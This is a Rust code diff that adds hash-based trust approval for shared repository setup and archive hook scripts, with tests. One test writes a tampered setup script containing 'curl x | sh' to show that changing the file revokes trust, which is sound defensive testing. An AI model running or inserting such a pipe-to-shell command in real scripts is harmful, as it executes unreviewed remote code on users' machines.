@@ -8,6 +8,7 @@ use std::path::Path;
 
 use serde::{Deserialize, Serialize};
 
+use crate::registry::write_atomic;
 use crate::{Registry, RepoEntry, ScriptSource, SetupPolicy, WorkspaceError, path_key};
 
 /// The shared repo file, at the worktree root.
@@ -279,15 +280,30 @@ fn load_trust(data: &Path) -> TrustStore {
         .unwrap_or_default()
 }
 
-/// Records that the person trusts this exact shared script of a repo.
+/// Records that the person trusts this exact shared script of a repo. It
+/// replaces the repo's earlier trust for that kind; a corrupt store starts
+/// over. The caller checks `hash` against the file (`trust_hook`).
 pub fn trust(
-    _data: &Path,
-    _repo_id: &str,
-    _kind: HookKind,
-    _hash: &str,
-    _now_ms: i64,
+    data: &Path,
+    repo_id: &str,
+    kind: HookKind,
+    hash: &str,
+    now_ms: i64,
 ) -> Result<(), WorkspaceError> {
-    Ok(())
+    let mut store = load_trust(data);
+    store.version = 1;
+    store
+        .entries
+        .retain(|e| !(e.repo_id == repo_id && e.kind == kind));
+    store.entries.push(TrustEntry {
+        repo_id: repo_id.to_owned(),
+        kind,
+        hash: hash.to_owned(),
+        approved_ms: now_ms,
+    });
+    let json =
+        serde_json::to_vec_pretty(&store).map_err(|e| WorkspaceError::Corrupt(e.to_string()))?;
+    write_atomic(data, TRUST_FILE, &json)
 }
 
 /// `trust` for the worktree's current shared script; `HookUntrusted` when
@@ -296,11 +312,31 @@ pub fn trust_hook(
     reg: &Registry,
     data: &Path,
     worktree: &Path,
-    _kind: HookKind,
-    _hash: &str,
-    _now_ms: i64,
+    kind: HookKind,
+    hash: &str,
+    now_ms: i64,
 ) -> Result<RepoHooks, WorkspaceError> {
+    let hooks = hooks_for(reg, data, worktree)?;
+    let script = match kind {
+        HookKind::Setup => &hooks.setup,
+        HookKind::Archive => &hooks.archive,
+    };
+    let current = script
+        .as_ref()
+        .filter(|s| s.shared)
+        .map(|s| s.hash.as_str());
+    if current != Some(hash) {
+        return Err(WorkspaceError::HookUntrusted(kind_name(kind).to_owned()));
+    }
+    trust(data, &repo_of(reg, worktree)?.id, kind, hash, now_ms)?;
     hooks_for(reg, data, worktree)
+}
+
+pub(crate) fn kind_name(kind: HookKind) -> &'static str {
+    match kind {
+        HookKind::Setup => "setup",
+        HookKind::Archive => "archive",
+    }
 }
 
 /// `XDEV_ROOT_PATH`, `XDEV_WORKTREE_PATH` and `XDEV_WORKSPACE_NAME` for a
@@ -586,5 +622,103 @@ mod tests {
             at(&["package.json", "pnpm-lock.yaml", "Cargo.toml"]).as_deref(),
             Some("pnpm install")
         );
+    }
+
+    impl Fixture {
+        fn trust(&self, kind: HookKind, hash: &str) -> Result<RepoHooks, WorkspaceError> {
+            trust_hook(&self.reg, &self.data, &self.worktree, kind, hash, 7)
+        }
+        fn store(&self) -> TrustStore {
+            serde_json::from_slice(&fs::read(self.data.join(TRUST_FILE)).unwrap()).unwrap()
+        }
+    }
+
+    #[test]
+    fn trusting_the_current_hash_trusts_until_the_file_changes() {
+        let f = fixture();
+        f.write(&f.worktree, FILE);
+        let hash = f.hooks().setup.unwrap().hash;
+        let after = f.trust(HookKind::Setup, &hash).unwrap();
+        assert!(after.setup.unwrap().trusted);
+        // Trust is per kind.
+        assert!(!after.archive.unwrap().trusted);
+        assert_eq!(
+            f.store(),
+            TrustStore {
+                version: 1,
+                entries: vec![TrustEntry {
+                    repo_id: "abc".into(),
+                    kind: HookKind::Setup,
+                    hash,
+                    approved_ms: 7,
+                }],
+            }
+        );
+
+        f.write(
+            &f.worktree,
+            "[scripts]\nsetup = \"pnpm install && curl x | sh\"\n",
+        );
+        assert!(!f.hooks().setup.unwrap().trusted);
+    }
+
+    #[test]
+    fn trusting_a_stale_or_missing_hash_is_refused() {
+        let f = fixture();
+        f.write(&f.worktree, FILE);
+        let err = f.trust(HookKind::Setup, &hex("old script")).unwrap_err();
+        assert_eq!(err.code(), "hook_untrusted");
+        assert!(!f.data.join(TRUST_FILE).exists());
+
+        // A local-only script has no shared part to trust.
+        f.write(&f.worktree, "[agent]\nwait_for_setup = true\n");
+        let err = f.trust(HookKind::Setup, "").unwrap_err();
+        assert_eq!(err.code(), "hook_untrusted");
+    }
+
+    #[test]
+    fn a_new_trust_replaces_the_old_one_for_that_repo_and_kind() {
+        let f = fixture();
+        f.write(&f.worktree, FILE);
+        let archive = f.hooks().archive.unwrap().hash;
+        f.trust(HookKind::Archive, &archive).unwrap();
+        f.write(
+            &f.worktree,
+            "[scripts]\nsetup = \"pnpm install\"\narchive = \"make clean\"\n",
+        );
+        let next = f.hooks().archive.unwrap().hash;
+        f.trust(HookKind::Archive, &next).unwrap();
+        let store = f.store();
+        assert_eq!(store.entries.len(), 1);
+        assert_eq!(store.entries[0].hash, next);
+        let left: Vec<_> = fs::read_dir(&f.data)
+            .unwrap()
+            .map(|e| e.unwrap().file_name())
+            .collect();
+        assert_eq!(left, [TRUST_FILE]); // no temp file left behind
+    }
+
+    #[test]
+    fn a_corrupt_store_trusts_nothing_and_is_rewritten() {
+        let f = fixture();
+        f.write(&f.worktree, FILE);
+        let hash = f.hooks().setup.unwrap().hash;
+        fs::write(f.data.join(TRUST_FILE), "{not json").unwrap();
+        assert!(!f.hooks().setup.unwrap().trusted);
+        f.trust(HookKind::Setup, &hash).unwrap();
+        assert_eq!(f.store().entries.len(), 1);
+        assert!(f.hooks().setup.unwrap().trusted);
+    }
+
+    #[test]
+    fn trust_keeps_other_repos() {
+        let dir = tempfile::tempdir().unwrap();
+        trust(dir.path(), "one", HookKind::Setup, "h1", 1).unwrap();
+        trust(dir.path(), "two", HookKind::Setup, "h2", 2).unwrap();
+        trust(dir.path(), "one", HookKind::Setup, "h3", 3).unwrap();
+        let store = load_trust(dir.path());
+        assert!(store.has("two", HookKind::Setup, "h2"));
+        assert!(store.has("one", HookKind::Setup, "h3"));
+        assert!(!store.has("one", HookKind::Setup, "h1"));
     }
 }
